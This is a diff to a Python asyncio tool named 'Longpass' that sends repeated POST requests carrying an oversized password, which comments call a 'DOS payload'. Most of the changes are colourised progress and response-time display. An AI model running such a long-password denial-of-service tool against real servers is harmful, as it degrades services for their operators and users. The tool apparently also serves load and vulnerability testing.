@@ -2,6 +2,7 @@ import sys
 import asyncio
 import aiohttp
 import time
+from termcolor import colored
 
 class Longpass:
 
@@ -15,26 +16,27 @@ class Longpass:
     iterations = 0
     tasks = list()
     payload = dict()
+    response_time = 0
 
     ui = list()
 
     def run(self):
 
-
-        self.updateUI(2, "Generating password...")
+        # Generate the password
+        self.updateUI(2, "Generating the password...")
         password = self.generatePassword(self.size)
-        self.updateUI(2, "Done!")
+        self.updateUI(2, "Done!\n")
 
         # Set the POST payload
         # @todo Add POST variables from the command line argument, ie. --variables username=john,email=user@domain.com
         # @todo Add an ability to set a custom variable name for the "password" DOS payload variable
-        self.payload = { 'username': self.username, 'password': password }
-
+        #self.payload = { 'username': self.username, 'password': password }
+        self.payload['password'] = password
 
         # Add requests to the task list
         for i in range(self.repeats):
             delay = i * self.delay
-            self.updateUI((i+4), "Request " + str(i+1) + ": Scheduled...")
+            self.updateUI((i+4), colored("Request " + str(i+1) + ": Scheduled...", 'grey'))
             self.tasks.append(self.makeRequest(delay, i))
 
         # Event loop that waits for tasks to complete
@@ -49,10 +51,8 @@ class Longpass:
         loop.close()
 
 
-    def shootTasks(self):
-        for i in range(self.repeats):
-            self.makeRequest()
-            time.sleep(self.delay)
+    def bold(self, msg):
+        return u'\033[1m%s\033[0m' % msg
 
     def generatePassword(self, size):
         # Generate password
@@ -60,36 +60,40 @@ class Longpass:
         return "x" * size
 
     def clear(self):
-        """Clear screen, return cursor to top left"""
+        # Clear screen, return cursor to top left
         sys.stdout.write('\033[2J')
         sys.stdout.write('\033[H')
         sys.stdout.flush()
 
     def updateUI(self, position, txt):
-        # EAFP
+        # Set the UI dict line, EAFP style
         try:
             self.ui[position] = txt
         except IndexError:
             self.ui.insert(position, txt)
 
-        #progress = str(round((self.iterations / (self.repeats * 2)) * 100, 2)) + "% done"
-        progress = "Mister"
-
-        '''
-        try:
-            self.ui[16] = progress
-        except IndexError:
-            self.ui.insert(16, progress)
-        '''
-        self.clear()
+        #self.clear()
         for msg in self.ui:
             sys.stdout.write(msg + "\n")
-        #sys.stdout.write("" + str(round((self.iterations / (self.repeats * 2)) * 100, 2)) + "% done - server response time " + str(round(duration, 2)) + " seconds.\n")
-        #sys.stdout.write("Server response time " + str(round(duration, 2)) + " seconds.")
 
     def progress(self,step):
+
+        # Add step to progress
         self.iterations += step
-        progress = "\n" + str(round((self.iterations / (self.repeats * 2)) * 100, 2)) + "% done"
+
+        color = 'white'
+
+        # Set warning colors for server response time
+        if self.response_time <= 5:
+            color = 'white'
+        if self.response_time >= 6:
+            color = 'yellow'
+        if self.response_time >= 20:
+            color = 'red'
+
+        percentage = colored("\n" + str(round((self.iterations / (self.repeats * 2)) * 100, 1)) + "% done", 'white', attrs=['bold']) + " - "
+        response = "Server response time: "+ colored(str(round(self.response_time, 4)), color, attrs=['bold']) +" sec"
+        progress = percentage + response
         self.updateUI(self.repeats + 3, progress)
 
     async def makeRequest(self, delay, i):
@@ -97,17 +101,16 @@ class Longpass:
         Make an asynchronous POST request
         """
 
-
-        position = 3 + i
-
-        #self.updateUI(position, "Request " + str(i+1) + " waiting...")
-
-        # Queue up
+        # Wait until it's time
         await asyncio.sleep(delay)
 
+        # UI line position
+        position = 3 + i
+
+        # Request id for UI
         id = "Request " + str(i+1)
 
-        self.updateUI(position, id + ": Sending request...")
+        self.updateUI(position, colored(id + ": Sending request...", 'yellow'))
 
         # Add to iteration counter
         self.progress(1)
@@ -126,14 +129,10 @@ class Longpass:
         # Request response time
         duration = time.time() - start
 
-        # Display the progress
-        #self.printStatus(duration)
+        self.response_time = duration
 
-        #self.updateUI(3, str(round((self.iterations / (self.repeats * 2)) * 100, 2)) + "% done - server response time " + str(round(duration, 2)) + " seconds.\n")
-        self.updateUI(position, id + ": Done, server response time " + str(round(duration, 2)) + " seconds.")
+        # Display the progress
+        self.updateUI(position, colored(id + ": Done, server response time " + str(round(duration, 2)) + " seconds.", 'green', attrs=['bold']))
 
         # Close the connection
         response.close()
-
-        # Wait for a given time
-        #time.sleep(self.delay)
